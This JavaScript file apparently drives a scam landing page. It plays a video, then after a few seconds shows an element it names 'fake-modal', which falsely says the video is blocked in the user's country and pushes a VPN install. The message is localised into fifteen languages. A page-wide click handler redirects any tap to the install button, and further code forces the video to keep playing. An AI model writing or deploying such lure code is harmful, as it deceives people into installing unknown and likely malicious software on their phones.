document.body.style.overflow ="hidden";

(function () {
  const setViewportHeight = () => {
    const viewportHeight = window.visualViewport
      ? window.visualViewport.height
      : window.innerHeight;

    document.documentElement.style.setProperty(
      "--app-viewport-height",
      `${Math.round(viewportHeight)}px`
    );
  };

  setViewportHeight();
  window.addEventListener("resize", setViewportHeight);
  window.addEventListener("orientationchange", setViewportHeight);

  if (window.visualViewport) {
    window.visualViewport.addEventListener("resize", setViewportHeight);
    window.visualViewport.addEventListener("scroll", setViewportHeight);
  }
})();

document.addEventListener("DOMContentLoaded", function () {
    const bg = document.querySelector(".screen-bg");
    const frame = document.querySelector(".iphone-frame");
    const modal = document.querySelector(".fake-modal");
    const installBanner = document.querySelector(".install-banner");
    const bgVideo = document.querySelector(".video-bg");
    const modalDelayMs = 3500;
    const videoSources = [
      "./video/video-frame-noaudio.mp4",
      "./video/video-frame.mp4",
    ];
    let pauseVideo = () => {};
    let keepVideoPlayingId = null;
    let activeVideoSourceIndex = 0;
    let modalShown = false;
  


    let totalSeconds = "60";
    let timerStarted = false;
    let switched = false;
    let intervalId = null;

 const translations = {
  en: {
  modal_title_key: "The video cannot be played!",
  modal_text_key: 'The video is blocked in your country. To watch the video, click <span class="install-word">"Install"</span> and set up a VPN on your phone.',
  scan_now_option: "Install VPN",
},

fr: {
modal_title_key: "La vidéo ne peut pas être lue !",
modal_text_key: 'La vidéo est bloquée dans votre pays. Pour la regarder, cliquez sur <span class="install-word">"Installer"</span> et configurez un VPN sur votre téléphone.',
scan_now_option: "Installer VPN",
},

"pt-PT": {
modal_title_key: "O vídeo não pode ser reproduzido!",
modal_text_key: 'O vídeo está bloqueado no seu país. Para assistir, clique em <span class="install-word">"Instalar"</span> e configure uma VPN no seu telefone.',
scan_now_option: "Instalar VPN",
},

"pt-BR": {
modal_title_key: "O vídeo não pode ser reproduzido!",
modal_text_key: 'O vídeo está bloqueado no seu país. Para assistir, clique em <span class="install-word">"Instalar"</span> e configure uma VPN no seu telefone.',
scan_now_option: "Instalar VPN",
},

es: {
modal_title_key: "¡El video no se puede reproducir!",
modal_text_key: 'El video está bloqueado en tu país. Para verlo, haz clic en <span class="install-word">"Instalar"</span> y configura una VPN en tu teléfono.',
scan_now_option: "Instalar VPN",
},

"es-419": {
modal_title_key: "¡El video no se puede reproducir!",
modal_text_key: 'El video está bloqueado en tu país. Para verlo, haz clic en <span class="install-word">"Instalar"</span> y configura una VPN en tu teléfono.',
scan_now_option: "Instalar VPN",
},

da: {
modal_title_key: "Videoen kan ikke afspilles!",
modal_text_key: 'Videoen er blokeret i dit land. Klik på <span class="install-word">"Installer"</span>, og opsæt en VPN på din telefon.',
scan_now_option: "Installer VPN",
},

ja: {
modal_title_key: "動画を再生できません！",
modal_text_key: 'この動画はお住まいの国でブロックされています。視聴するには<span class="install-word">「インストール」</span>をクリックし、スマートフォンでVPNを設定してください。',
scan_now_option: "VPNをインストール",
},

fil: {
modal_title_key: "Hindi ma-play ang video!",
modal_text_key: 'Naka-block ang video sa iyong bansa. Para mapanood ito, i-click ang <span class="install-word">"I-install"</span> at mag-set up ng VPN sa iyong phone.',
scan_now_option: "I-install VPN",
},

de: {
modal_title_key: "Das Video kann nicht abgespielt werden!",
modal_text_key: 'Das Video ist in Ihrem Land blockiert. Klicken Sie auf <span class="install-word">"Installieren"</span> und richten Sie ein VPN auf Ihrem Telefon ein.',
scan_now_option: "VPN installieren",
},

nb: {
modal_title_key: "Videoen kan ikke spilles av!",
modal_text_key: 'Videoen er blokkert i landet ditt. Klikk på <span class="install-word">"Installer"</span> og sett opp en VPN på telefonen.',
scan_now_option: "Installer VPN",
},

sv: {
modal_title_key: "Videon kan inte spelas upp!",
modal_text_key: 'Videon är blockerad i ditt land. Klicka på <span class="install-word">"Installera"</span> och konfigurera en VPN på din telefon.',
scan_now_option: "Installera VPN",
},

it: {
modal_title_key: "Il video non può essere riprodotto!",
modal_text_key: 'Il video è bloccato nel tuo Paese. Per guardarlo, fai clic su <span class="install-word">"Installa"</span> e configura una VPN sul telefono.',
scan_now_option: "Installa VPN",
},

nl: {
modal_title_key: "De video kan niet worden afgespeeld!",
modal_text_key: 'De video is geblokkeerd in uw land. Klik op <span class="install-word">"Installeren"</span> en stel een VPN in op uw telefoon.',
scan_now_option: "VPN installeren",
},

ro: {
modal_title_key: "Videoclipul nu poate fi redat!",
modal_text_key: 'Videoclipul este blocat în țara ta. Pentru a-l viziona, apasă <span class="install-word">"Instalează"</span> și configurează un VPN pe telefon.',
scan_now_option: "Instalează VPN",
},
};

  const definedLanguages = [
    "en", "fr", "pt-PT", "pt-BR", "es", "es-419",
    "da", "ja", "fil", "de", "nb", "sv", "it", "nl", "ro"
  ];

  const currentLocale = (navigator && navigator.language) || "en";

  const getLocale = () => {
    if (translations[currentLocale]) return currentLocale;

    const shortLocale = currentLocale.slice(0, 2);
    if (translations[shortLocale]) return shortLocale;

    return "en";
  };

  const locale = getLocale();
  const t = translations[locale] || translations.en;

  document.documentElement.lang = locale;

  document.getElementById("modal_title_key").textContent = t.modal_title_key;
  document.getElementById("modal_text_key").innerHTML = t.modal_text_key || translations.en.modal_text_key;
  document.getElementById("scan_now_option").textContent = t.scan_now_option;


document.addEventListener("click", function (e) {
    const installBtn = document.getElementById("goStep1");
    if (!installBtn) return;
    if (e.target.closest("#goStep1")) return;
    installBtn.click();
});




    if (bgVideo) {
      bgVideo.muted = true;
      bgVideo.defaultMuted = true;
      bgVideo.playsInline = true;
      bgVideo.setAttribute("muted", "");
      bgVideo.setAttribute("defaultmuted", "");
      bgVideo.setAttribute("playsinline", "");
      bgVideo.setAttribute("webkit-playsinline", "");
      bgVideo.setAttribute("autoplay", "");
      bgVideo.setAttribute("loop", "");
      bgVideo.setAttribute("preload", "auto");
      bgVideo.disablePictureInPicture = true;

      const tryPlay = () => {
        if (modalShown) return;

        const playPromise = bgVideo.play();
        if (playPromise && typeof playPromise.catch === "function") {
          playPromise.catch(() => {});
        }
      };

      const resumeVideo = (force) => {
        if (modalShown) return;
        if (!force && document.hidden) return;

        bgVideo.muted = true;
        tryPlay();
        window.setTimeout(tryPlay, 250);
        window.setTimeout(tryPlay, 1000);
      };

      const tryBlobFallback = () => {
        if (modalShown || bgVideo.dataset.blobFallback === "1" || bgVideo.readyState >= 2) {
          return;
        }

        bgVideo.dataset.blobFallback = "1";

        fetch(videoSources[activeVideoSourceIndex])
          .then((response) => {
            if (!response.ok) {
              throw new Error("Video fallback failed");
            }

            return response.blob();
          })
          .then((blob) => {
            if (modalShown) return;

            bgVideo.src = URL.createObjectURL(blob);
            bgVideo.load();
            resumeVideo(true);
          })
          .catch(() => {});
      };

      pauseVideo = () => {
        bgVideo.pause();
      };

      bgVideo.addEventListener("error", () => {
        const nextSource = videoSources[activeVideoSourceIndex + 1];

        if (nextSource) {
          activeVideoSourceIndex += 1;
          bgVideo.src = nextSource;
          bgVideo.load();
          resumeVideo(true);
        } else {
          tryBlobFallback();
        }
      });
      bgVideo.addEventListener("loadeddata", () => resumeVideo(true), { once: true });
      bgVideo.addEventListener("loadedmetadata", () => resumeVideo(true), { once: true });
      bgVideo.addEventListener("canplay", () => resumeVideo(true), { once: true });
      bgVideo.addEventListener("pause", () => {
        if (!modalShown) {
          window.setTimeout(resumeVideo, 300);
        }
      });
      window.addEventListener("pageshow", () => resumeVideo(true));
      window.addEventListener("focus", () => resumeVideo(true));
      window.addEventListener("blur", () => {
        window.setTimeout(resumeVideo, 500);
      });
      document.addEventListener("visibilitychange", () => {
        if (!document.hidden) {
          resumeVideo(true);
        }
      });
      document.addEventListener("touchstart", () => resumeVideo(true), { passive: true });
      if (!bgVideo.getAttribute("src")) {
        bgVideo.src = videoSources[activeVideoSourceIndex];
        bgVideo.load();
      }
      resumeVideo(true);
      window.setTimeout(tryBlobFallback, 1200);
      keepVideoPlayingId = window.setInterval(() => {
        if (!document.hidden && bgVideo.paused) {
          resumeVideo();
        }
      }, 1000);
    }

    window.setTimeout(() => {
      modalShown = true;
      if (keepVideoPlayingId) {
        window.clearInterval(keepVideoPlayingId);
      }

      if (bg) {
        bg.classList.add("active");
      }
      if (frame) {
        frame.classList.add("offer-active");
      }
      if (installBanner) {
        installBanner.style.display = "flex";
        installBanner.style.opacity = "1";
        installBanner.style.transform = "translateY(0)";
      }
      if (modal) {
        modal.style.opacity = "1";
        modal.style.transform = "translateY(0)";
      }

      if (bgVideo) {
        bgVideo.style.filter = "blur(18px)";
        bgVideo.style.transform = "scale(1.08)";
        pauseVideo();
      }
    }, modalDelayMs);

  
(function () {
  const ua = navigator.userAgent;
  const isIOS = /iPhone|iPad|iPod/i.test(ua);
  const isChrome = /CriOS/i.test(ua);

  if (isIOS && isChrome) {
    document.body.classList.add('ios-chrome');
  }
})();
});
